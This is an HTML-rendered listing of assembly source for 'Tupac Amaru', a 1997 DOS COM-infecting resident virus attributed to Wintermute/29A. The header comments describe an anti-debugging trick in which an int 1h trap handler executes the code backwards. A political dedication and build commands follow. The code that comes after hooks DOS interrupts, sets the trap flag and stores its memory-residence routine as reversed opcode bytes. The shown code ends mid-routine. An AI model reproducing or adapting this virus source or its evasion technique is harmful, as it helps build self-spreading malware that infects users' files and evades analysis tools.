<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Tupac.1308 - tupac.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; ≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤±</span><span class="sc0">
</span><span class="sc1">;≤≤±                       .:. .: .:..: :. : .. ::..                      ≤≤±</span><span class="sc0">
</span><span class="sc1">;≤±   Virus: Tupac Amaru  . ‹€€€€€‹.‹€€€€€‹.‹€€€€€‹..  Author: Wintermute  ≤±</span><span class="sc0">
</span><span class="sc1">;≤±       Size: 1308     ::.€€€ €€€:€€€ €€€.€€€ €€€:.:    Group: 29A       ≤±</span><span class="sc0">
</span><span class="sc1">;≤±   Date: August, 1997 .: .‹‹‹€€ﬂ.ﬂ€€€€€€:€€€€€€€ .:. Origin: Espa§a     ≤±</span><span class="sc0">
</span><span class="sc1">;≤±                     &gt;===€€€‹‹‹‹=‹‹‹‹€€€=€€€=€€€===-&gt;&gt;                  ≤±</span><span class="sc0">
</span><span class="sc1">;≤±                   .: .:.€€€€€€€:€€€€€€ﬂ.€€€ €€€: .:.:..                ≤±</span><span class="sc0">
</span><span class="sc1">;≤≤±                ..: ::. . .:.. .: ..:.::.. .:.. :.. :.:..             ≤≤±</span><span class="sc0">
</span><span class="sc1">; ≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤±</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  This virus itself is just a COM TSR virus... but... the innovation it has</span><span class="sc0">
</span><span class="sc1">; justifies the whole virus as something really  cool  and  new... it's  the</span><span class="sc0">
</span><span class="sc1">; first virus ever in the world that executes its code **BACKWARDS**.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  By means of int 1h, it executes one  instruction, reverses the opcodes of</span><span class="sc0">
</span><span class="sc1">; the next one ( which is actually the one before :) ) and  sets IP  to that</span><span class="sc0">
</span><span class="sc1">; position, reversing  again  the instruction  that has  been just executed.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Let's imagine Tupac at this position:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       db  0c7h, 08eh</span><span class="sc0">
</span><span class="sc1">; ƒƒƒ  mov ax,2521h</span><span class="sc0">
</span><span class="sc1">;       [...]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Just after  the "mov ax,2521h" is  executed, the compiler  will set CS:IP</span><span class="sc0">
</span><span class="sc1">; for the next instruction and then call int 1h. Then, we'll move that value</span><span class="sc0">
</span><span class="sc1">; into DS:SI, substracting to SI the  size of "mov ax,2521h" (three bytes in</span><span class="sc0">
</span><span class="sc1">; this example; this size is known because the instruction length is checked</span><span class="sc0">
</span><span class="sc1">; during the last call before this one).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  We decrement SI by one, so we  point to "08eh". The engine will then load</span><span class="sc0">
</span><span class="sc1">; this  opcode and find  the corresponding  instruction length, getting 2 as</span><span class="sc0">
</span><span class="sc1">; result, and thus picking two bytes ( 08eh and the previous one, 0c7h ). So</span><span class="sc0">
</span><span class="sc1">; that, it will substract 2 to SI, push  the instruction opcodes, and pop'em</span><span class="sc0">
</span><span class="sc1">; backwards, changing  the CS:IP stored in  the  stack in  order to point to</span><span class="sc0">
</span><span class="sc1">; this  instruction. Also, it will  reverse the instruction  which has  just</span><span class="sc0">
</span><span class="sc1">; been executed ( mov ax,2521h ).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  For every int 21h call, Tupac  uses the "nop" instruction, 090h. It saves</span><span class="sc0">
</span><span class="sc1">; bytes, and also a good amount of time when trying to solve many problems.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Conditional jumps  are checked before  they're executed: if the reversing</span><span class="sc0">
</span><span class="sc1">; engine has just decrypted the instruction before it, the updated CS:IP and</span><span class="sc0">
</span><span class="sc1">; encrypted the next, it's obvious  that the virus will hang. So, the engine</span><span class="sc0">
</span><span class="sc1">; checks  the flags... jump is  made  three bytes  after the  instruction it</span><span class="sc0">
</span><span class="sc1">; should jump to ( cause 2+1 will be substracted in order to get to the last</span><span class="sc0">
</span><span class="sc1">; opcode of the instruction we want to execute ).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  This is  because  Tupac  executes  backwards, making  impossible  for any</span><span class="sc0">
</span><span class="sc1">; debugger to  trace it; MS-DOS debug, GameTools, Soft-ICE and TurboDebugger</span><span class="sc0">
</span><span class="sc1">; just get lost... the only way I found to check how the virus worked was by</span><span class="sc0">
</span><span class="sc1">; guessing  with  some tricks  and  using  AVPUtil ( fucking  good  program,</span><span class="sc0">
</span><span class="sc1">; Kasp! ). All  the  debugging  programs  I  know ( including AVPUtil if you</span><span class="sc0">
</span><span class="sc1">; are not  modifying all  the time CS:IP  in  order to  execute  the correct</span><span class="sc0">
</span><span class="sc1">; instructions ) will  continue  executing the  whole code  forwards without</span><span class="sc0">
</span><span class="sc1">; realising  about wtf's really happening there ( and this obviously happens</span><span class="sc0">
</span><span class="sc1">; with AV software as well ).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  The virus is dedicated to the revolutionary  group  Tupac  Amaru  members</span><span class="sc0">
</span><span class="sc1">; who were killed after surrendering by the  Peruvian  army  forces  in  the</span><span class="sc0">
</span><span class="sc1">; attack to the japanese embassy in  Per£,  Lima.  The  rebels  surrendered,</span><span class="sc0">
</span><span class="sc1">; and Fujimori's men killed them one by one; the embassy  was  burning  with</span><span class="sc0">
</span><span class="sc1">; the rebels inside it - among them a 16 year  old  girl  -  while  Fujimori</span><span class="sc0">
</span><span class="sc1">; was congratulating his troops and  singing  the  peruvian  national  hymn,</span><span class="sc0">
</span><span class="sc1">; talking with journalists to raise more popular and win the next elections.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Also dedicated ( as so dedicated as it is to Tupac Amaru killed members )</span><span class="sc0">
</span><span class="sc1">; to the miners that excavated the tunnel to the embassy  for  the  gov  and</span><span class="sc0">
</span><span class="sc1">; later  "dissapeared",  and  to  all  of  Fujimori's  victims:  dissapeared</span><span class="sc0">
</span><span class="sc1">; students, tortured "enemies", and people who fight for democracy there...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Well, also to all the people in the world that are  punished  because  of</span><span class="sc0">
</span><span class="sc1">; talking about democracy and human rights :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Also some greetings to AVV, who told me about an  idea  about  executing</span><span class="sc0">
</span><span class="sc1">; a decrypting routine backwards... idea I took, gave form,  extended  to  a</span><span class="sc0">
</span><span class="sc1">; complete virus,... and finally brought ya ;)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;             Habr† un d°a en que todos, al levantar la vista,</span><span class="sc0">
</span><span class="sc1">;                  veremos una tierra, que ponga libertad.</span><span class="sc0">
</span><span class="sc1">;                Sonar†n las campanas desde los campanarios,</span><span class="sc0">
</span><span class="sc1">;                 y los campos desiertos, volveran a granar,</span><span class="sc0">
</span><span class="sc1">;                unas espigas altas, dispuestas para el pan.</span><span class="sc0">
</span><span class="sc1">;            Para un pan que en los siglos, nunca fue repartido,</span><span class="sc0">
</span><span class="sc1">;               entre todos aquellos, que hicieron lo posible,</span><span class="sc0">
</span><span class="sc1">;                por empujar la historia, hacia la libertad.</span><span class="sc0">
</span><span class="sc1">;                    ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;                        ( from a revolution song )</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   tasm tupac.asm /m2</span><span class="sc0">
</span><span class="sc1">;   tlink tupac.obj</span><span class="sc0">
</span><span class="sc1">;   x2b tupac.exe tupac.com         ; An utility near Exe2bin</span><span class="sc0">
</span><span class="sc1">;   del tupac.exe</span><span class="sc0">


</span><span class="sc2">.286</span><span class="sc0">
</span><span class="sc5">kodigo</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc12">'code'</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">kodigo</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">kodigo</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">kodigo</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">tupac_start</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">Tupac_amaru</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                   </span><span class="sc1">; We take the delta-offset</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

</span><span class="sc5">backtrace</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">installing_on</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21h</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">25a9h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3501h</span><span class="sc0">                </span><span class="sc1">; Get 1h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int1h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int1h</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">back_zone</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">   </span><span class="sc1">; Set it to the zone that's going</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">            </span><span class="sc1">;to control the backwards execution</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">                       </span><span class="sc1">; Now we set trap flag to 1</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">end_or_init</span><span class="sc0">     </span><span class="sc1">; To the beginning ( or end ? ;D )</span><span class="sc0">
                                        </span><span class="sc1">;of the code</span><span class="sc0">


</span><span class="sc5">return</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; For the push/pop of all regs</span><span class="sc0">
</span><span class="sc5">instanterior</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Just executed instruction bytes</span><span class="sc0">
</span><span class="sc5">installing_on</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Backtrace working ?</span><span class="sc0">

</span><span class="sc5">offset_jmp</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">hay_salto</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;  1.- Interrupt 21h</span><span class="sc0">
                                </span><span class="sc1">;  2,3.- Jump</span><span class="sc0">

</span><span class="sc5">salto</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">
</span><span class="sc5">lugarsalto</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">;  Jump to virus code</span><span class="sc0">
</span><span class="sc5">buffer</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">53h</span><span class="sc4">,</span><span class="sc2">53h</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">     </span><span class="sc1">;  Buffer with host bytes</span><span class="sc0">

</span><span class="sc5">virus_name</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' The Tupac Amaru virus, dedicated to all the people of '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'the MRTA who were killed by Fujimori''s troops after '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'surrendering at the japanese embassy on Lima, to all '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'the people killed and tortured in his government, and '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'finally to all those who work for democracy and for a '</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'better world.'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_Winter_</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Wintermute/29A'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">;                         RESIDENCE ROUTINE ZONE</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   You should read this next backwards ;)</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c3h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0a5h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0a5h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">057h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0bfh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0aeh</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">076h</span><span class="sc4">,</span><span class="sc2">08dh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01fh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">07h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eh</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">

</span><span class="sc5">jmp1</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; Restore first four bytes</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">090h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01fh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">025h</span><span class="sc4">,</span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">place_ff</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">place_21</span><span class="sc4">-(</span><span class="sc5">place_ff</span><span class="sc4">*</span><span class="sc2">100h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0bah</span><span class="sc0">

                        </span><span class="sc1">; Int 21h setting</span><span class="sc0">

</span><span class="sc5">jjmp7</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jmp7</span><span class="sc4">)-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jjmp7</span><span class="sc4">)),</span><span class="sc2">075h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">49h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0a4h</span><span class="sc0">
</span><span class="sc5">jmp7</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">tupac_ff</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">tupac_size</span><span class="sc4">-(</span><span class="sc5">tupac_ff</span><span class="sc4">*</span><span class="sc2">100h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b9h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eeh</span><span class="sc4">,</span><span class="sc2">089h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">031h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c7h</span><span class="sc4">,</span><span class="sc2">08eh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">047h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">03eh</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">026h</span><span class="sc0">

                        </span><span class="sc1">; Copy virus to memory</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">tupac_parag</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">02eh</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc2">026h</span><span class="sc0">
</span><span class="sc5">jjmp6</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">-((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jjmp6</span><span class="sc4">)-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jmp1</span><span class="sc4">)),</span><span class="sc2">072h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">tupac_parag</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">03eh</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">026h</span><span class="sc0">

                        </span><span class="sc1">; Some checks</span><span class="sc0">
</span><span class="sc5">jmp4</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">jjmp5</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">-((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jjmp5</span><span class="sc4">)-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jmp1</span><span class="sc4">)),</span><span class="sc2">075h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">016h</span><span class="sc4">,</span><span class="sc2">039h</span><span class="sc4">,</span><span class="sc2">026h</span><span class="sc0">
</span><span class="sc5">jjmp4</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">-((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jjmp4</span><span class="sc4">)-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jmp4</span><span class="sc4">))+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">03eh</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc2">026h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dah</span><span class="sc4">,</span><span class="sc2">08ch</span><span class="sc0">

                        </span><span class="sc1">; We check if we fit in memory: if last Mcb is</span><span class="sc0">
                        </span><span class="sc1">;empty or it's program Psp</span><span class="sc0">

</span><span class="sc5">jmp2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jmp3</span><span class="sc4">)-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jmp2</span><span class="sc4">)),</span><span class="sc2">0ebh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c7h</span><span class="sc4">,</span><span class="sc2">08eh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">047h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">03eh</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">026h</span><span class="sc0">
</span><span class="sc5">jjmp2</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0h</span><span class="sc4">-((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jjmp2</span><span class="sc4">)-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jmp2</span><span class="sc4">)),</span><span class="sc2">074h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">05ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">03eh</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">026h</span><span class="sc0">
</span><span class="sc5">jmp3</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc1">; Mcb Loop: Search for Mcb Z</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c7h</span><span class="sc4">,</span><span class="sc2">08eh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eh</span><span class="sc4">,</span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc4">,</span><span class="sc2">026h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc2">08eh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">048h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc2">08ch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">090h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc0">

                        </span><span class="sc1">; Search for the list of lists</span><span class="sc0">

</span><span class="sc5">jjmp1</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">-((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jjmp1</span><span class="sc4">)-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">jmp1</span><span class="sc4">))</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">074h</span><span class="sc0">
